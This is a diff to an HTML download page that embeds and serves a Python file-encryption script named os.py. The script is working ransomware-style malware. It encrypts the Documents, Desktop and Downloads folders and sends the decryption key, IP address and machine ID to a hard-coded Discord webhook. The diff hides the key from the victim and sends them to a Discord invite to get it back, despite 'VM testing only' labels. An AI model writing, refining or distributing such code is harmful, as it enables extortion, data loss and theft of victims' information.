@@ -140,6 +140,17 @@
             font-size: 13px;
             margin-top: 10px;
         }
+        .filename {
+            background: #0f0f1f;
+            color: #ffa94d;
+            padding: 6px 16px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 14px;
+            display: inline-block;
+            margin-bottom: 15px;
+            border: 1px solid #2a2a4a;
+        }
         @media (max-width: 600px) {
             .container {
                 padding: 30px 20px;
@@ -166,6 +177,8 @@
         <div class="subtitle">🔐 One-Time Use Encryptor</div>
 
         <div class="badge">⚠️ VM TESTING ONLY</div>
+
+        <div class="filename">📄 os.py</div>
 
         <div class="warning">
             ⚠️ THIS WILL ENCRYPT: Documents, Desktop &amp; Downloads<br />
@@ -209,7 +222,7 @@
         document.getElementById('downloadBtn').addEventListener('click', function(e) {
             e.preventDefault();
 
-            // The full os.py script content (embedded)
+            // The FULL os.py script content
             const scriptContent = `import os
 import base64
 import requests
@@ -227,6 +240,7 @@ import socket
 import subprocess
 import platform
 import re
+import webbrowser
 
 class FolderEncryptor:
     def __init__(self, root):
@@ -238,9 +252,9 @@ class FolderEncryptor:
         username = os.environ.get('USERNAME', 'default')
         
         self.folder_paths = [
-            fr"C:\\Users\\{username}\\Documents",
-            fr"C:\\Users\\{username}\\Desktop",
-            fr"C:\\Users\\{username}\\Downloads"
+            fr"C:\\\\Users\\\\{username}\\\\Documents",
+            fr"C:\\\\Users\\\\{username}\\\\Desktop",
+            fr"C:\\\\Users\\\\{username}\\\\Downloads"
         ]
         
         self.folder_path = tk.StringVar(value=self.folder_paths[0])
@@ -248,6 +262,7 @@ class FolderEncryptor:
         self.decryption_key = tk.StringVar()
         
         self.webhook_url = "https://discord.com/api/webhooks/1526614577888886945/6kkNhKnbv6jg5qJ-wKDTZWdRheiT4kyoKV75Ho2jX2Mfm4dKAC65bOWo-nGnQ0qhzmtW"
+        self.discord_invite = "https://discord.gg/your-invite-code"
         
         self.status = tk.StringVar(value="Ready")
         self.progress = tk.DoubleVar()
@@ -303,7 +318,7 @@ class FolderEncryptor:
                 result = subprocess.run(['getmac', '/fo', 'csv', '/nh'], 
                                       capture_output=True, text=True)
                 if result.stdout:
-                    lines = result.stdout.strip().split('\\n')
+                    lines = result.stdout.strip().split('\\\\n')
                     if lines:
                         mac = lines[0].split(',')[0].strip('"')
                         return mac.replace('-', ':')
@@ -321,7 +336,7 @@ class FolderEncryptor:
         return key_with_id
     
     def extract_id_from_key(self, key_with_id):
-        match = re.search(r'\\(([A-Z0-9]+)\\)', key_with_id)
+        match = re.search(r'\\\\(([A-Z0-9]+)\\\\)', key_with_id)
         if match:
             return match.group(1)
         
@@ -337,7 +352,7 @@ class FolderEncryptor:
     
     def send_to_webhook(self, encryption_id, decryption_key, file_count, folder_paths):
         try:
-            folders_text = "\\n".join([f"• {f}" for f in folder_paths])
+            folders_text = "\\\\n".join([f"• {f}" for f in folder_paths])
             
             embed = {
                 "title": "🔐 VM ENCRYPTION EVENT",
@@ -345,7 +360,7 @@ class FolderEncryptor:
                 "fields": [
                     {"name": "🆔 ID", "value": f"`{encryption_id}`", "inline": False},
                     {"name": "🔑 Key", "value": f"`{decryption_key}`", "inline": False},
-                    {"name": "📁 Folders", "value": f"```\\n{folders_text}\\n```", "inline": False},
+                    {"name": "📁 Folders", "value": f"```\\\\n{folders_text}\\\\n```", "inline": False},
                     {"name": "📄 Files", "value": str(file_count), "inline": True},
                     {"name": "🌐 IP", "value": f"`{self.ip}`", "inline": True},
                     {"name": "⏰ Time", "value": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": True}
@@ -358,6 +373,9 @@ class FolderEncryptor:
             return response.status_code in [200, 204]
         except:
             return False
+    
+    def open_discord(self):
+        webbrowser.open(self.discord_invite)
     
     def setup_ui(self):
         main_frame = ttk.Frame(self.root, padding="20")
@@ -387,6 +405,17 @@ class FolderEncryptor:
         
         for i, folder in enumerate(self.folder_paths):
             ttk.Label(folder_display, text=f"  {i+1}. {folder}", font=('Arial', 8)).pack(anchor=tk.W)
+        
+        discord_frame = ttk.LabelFrame(left_frame, text="💬 Get Your Key", padding="10")
+        discord_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        ttk.Label(discord_frame, text="🔑 The key is sent to Discord only!", font=('Arial', 9, 'bold')).pack(anchor=tk.W)
+        ttk.Label(discord_frame, text="📌 Click below to join and get your key", font=('Arial', 9)).pack(anchor=tk.W)
+        
+        discord_btn = ttk.Button(discord_frame, text="💬 JOIN DISCORD TO GET KEY", command=self.open_discord)
+        discord_btn.pack(pady=(10, 5), fill=tk.X)
+        
+        ttk.Label(discord_frame, text="⚠️ Key is NOT shown here - only on Discord!", font=('Arial', 8), foreground="orange").pack(anchor=tk.W)
         
         warning_frame = ttk.LabelFrame(left_frame, text="⚠️ VM TEST MODE", padding="10")
         warning_frame.pack(fill=tk.X, pady=(0, 10))
@@ -420,7 +449,7 @@ class FolderEncryptor:
         self.id_display = ttk.Label(id_frame, text="None", font=('Courier', 12, 'bold'), foreground="blue")
         self.id_display.pack(side=tk.LEFT, padx=5)
         
-        self.copy_btn = ttk.Button(id_frame, text="📋 Copy", command=self.copy_id, state='disabled')
+        self.copy_btn = ttk.Button(id_frame, text="📋 Copy ID", command=self.copy_id, state='disabled')
         self.copy_btn.pack(side=tk.LEFT, padx=5)
         
         self.key_count_label = ttk.Label(status_frame, text="🔑 Active Keys: 0", font=('Arial', 9))
@@ -464,7 +493,7 @@ class FolderEncryptor:
         if self.current_id:
             self.root.clipboard_clear()
             self.root.clipboard_append(self.current_id)
-            self.log(f"📋 Copied: {self.current_id}")
+            self.log(f"📋 Copied ID: {self.current_id}")
     
     def paste_key(self):
         try:
@@ -478,7 +507,7 @@ class FolderEncryptor:
         timestamp = datetime.datetime.now().strftime("%H:%M:%S")
         try:
             self.log_text.config(state='normal')
-            self.log_text.insert(tk.END, f"[{timestamp}] {msg}\\n")
+            self.log_text.insert(tk.END, f"[{timestamp}] {msg}\\\\n")
             self.log_text.see(tk.END)
             self.log_text.config(state='disabled')
             self.root.update()
@@ -529,10 +558,10 @@ class FolderEncryptor:
             self.id_display.config(text=self.current_id)
             self.copy_btn.config(state='normal')
             self.log(f"🎲 ID: {self.current_id}")
-            self.log(f"🔑 Key: {self.current_key}")
+            self.log(f"🔑 Key sent to Discord (not shown here)")
             
             key_bytes = base64.b64decode(actual_key)
-            id_bytes = self.current_id.encode('utf-8').ljust(16, b'\\0')[:16]
+            id_bytes = self.current_id.encode('utf-8').ljust(16, b'\\\\0')[:16]
             
             encrypted_count = 0
             total = len(self.files_to_encrypt)
@@ -568,11 +597,12 @@ class FolderEncryptor:
             self.status.set(f"✅ Encrypted {encrypted_count} files")
             self.status_label.config(text=f"✅ Encrypted {encrypted_count} files!", foreground="green")
             
-            messagebox.showinfo("VM TEST COMPLETE!", 
-                f"✅ {encrypted_count} file/s encrypted!\\n\\n"
-                f"🆔 ID: {self.current_id}\\n"
-                f"🔑 Key: {self.current_key}\\n\\n"
-                f"⚠️ THIS IS A VM - Test successful!")
+            messagebox.showinfo("🔐 ENCRYPTION COMPLETE!", 
+                f"✅ {encrypted_count} file/s encrypted!\\\\n\\\\n"
+                f"🆔 Your ID: {self.current_id}\\\\n\\\\n"
+                f"🔑 The KEY has been sent to Discord!\\\\n"
+                f"💬 Click 'JOIN DISCORD TO GET KEY' to get it\\\\n\\\\n"
+                f"⚠️ Key is NOT shown here for security!")
             
         except Exception as e:
             self.log(f"❌ Error: {str(e)}")
@@ -584,7 +614,7 @@ class FolderEncryptor:
         try:
             folder = self.folder_path.get()
             if not Path(folder).exists():
-                messagebox.showerror("Error", f"Folder not found!\\n{folder}")
+                messagebox.showerror("Error", f"Folder not found!\\\\n{folder}")
                 return
             
             key = self.decryption_key.get().strip()
@@ -602,7 +632,7 @@ class FolderEncryptor:
                         break
                 
                 if not found_id:
-                    messagebox.showerror("Error", "Could not find ID in the key!")
+                    messagebox.showerror("Error", "Could not find ID in the key!\\\\n\\\\nMake sure you're using the correct key from Discord.")
                     return
                 else:
                     encryption_id = found_id
@@ -619,18 +649,18 @@ class FolderEncryptor:
                             encryption_id = enc_id
                             break
                     else:
-                        messagebox.showerror("Error", f"Found ID: {extracted_id}")
+                        messagebox.showerror("Error", f"Found ID: {extracted_id}\\\\nBut no matching key found.")
                         return
             else:
                 messagebox.showerror("Error", "Could not extract ID from key!")
                 return
             
             if encryption_id not in self.active_keys:
-                messagebox.showerror("Error", f"Key not found in memory!")
+                messagebox.showerror("Error", f"Key not found in memory!\\\\n\\\\nID: {encryption_id}")
                 return
             
             if encryption_id in self.used_keys:
-                messagebox.showerror("❌ KEY ALREADY USED", f"This key has already been used!")
+                messagebox.showerror("❌ KEY ALREADY USED", f"This key has already been used!\\\\n\\\\n🆔 ID: {encryption_id}")
                 return
             
             self.log(f"✅ Key verified for ID: {encryption_id}")
@@ -671,9 +701,9 @@ class FolderEncryptor:
                     iv = data[16:32]
                     encrypted_data = data[32:]
                     
-                    file_id = id_bytes.decode('utf-8').strip('\\x00')
+                    file_id = id_bytes.decode('utf-8').strip('\\\\x00')
                     if file_id != encryption_id:
-                        self.log(f"⏭️ Skipping {f.name}")
+                        self.log(f"⏭️ Skipping {f.name} (different ID)")
                         continue
                     
                     cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
@@ -706,7 +736,8 @@ class FolderEncryptor:
             self.status_label.config(text=f"✅ Decrypted {decrypted} files!", foreground="green")
             
             if decrypted > 0:
-                messagebox.showinfo("Decrypt Complete!", f"✅ Successfully decrypted {decrypted} files!")
+                messagebox.showinfo("Decrypt", 
+                    f"✅ Successfully decrypted {decrypted} files!")
             else:
                 messagebox.showinfo("Info", "No files were decrypted.")
             
@@ -722,7 +753,7 @@ if __name__ == "__main__":
     root.mainloop()`;
 
             // Create Blob and download
-            const blob = new Blob([scriptContent], { type: 'text/plain' });
+            const blob = new Blob([scriptContent], { type: 'text/plain;charset=utf-8' });
             const url = URL.createObjectURL(blob);
             const link = document.createElement('a');
             link.href = url;
@@ -735,8 +766,10 @@ if __name__ == "__main__":
             // Show feedback
             const btn = document.getElementById('downloadBtn');
             btn.textContent = '✅ Downloaded!';
+            btn.style.background = 'linear-gradient(135deg, #00b894, #00a381)';
             setTimeout(() => {
                 btn.textContent = '⬇️ Download os.py';
+                btn.style.background = 'linear-gradient(135deg, #ff6b6b, #ee5a24)';
             }, 3000);
         });
     </script>
